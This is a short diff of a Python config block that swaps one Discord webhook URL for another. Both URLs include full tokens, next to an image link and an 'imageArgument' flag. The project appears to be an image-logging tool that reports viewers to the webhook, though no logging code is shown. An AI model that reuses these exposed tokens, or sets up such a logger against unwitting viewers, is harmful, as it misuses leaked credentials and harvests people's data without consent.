@@ -22,7 +22,7 @@ __version__ = "v2.0"
 __author__ = "lynxWings"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1155050182245888061/u0hxZ_ofMh9HQFwuXXWjwjHqnGmstYSqsS4ILQuBJqZEx8gAgDC8lY6CKlBHejrJOU00", # <------------------------- Put your webhook link here.
+    "webhook": "https://discord.com/api/webhooks/1157015075262058566/KbvdFL6xTMt6eA5Xh-XV3HBzvtecKLxmEg6PYmJH4FtFXMfTACkiYlIqAK6Y96aT7J9I", # <------------------------- Put your webhook link here.
     "image": "https://cdn.discordapp.com/attachments/1136614339101610084/1142039100145287188/Baslksz48_20230818114015.png", # <------------------------- Put image address link here.
     "imageArgument": True,
 
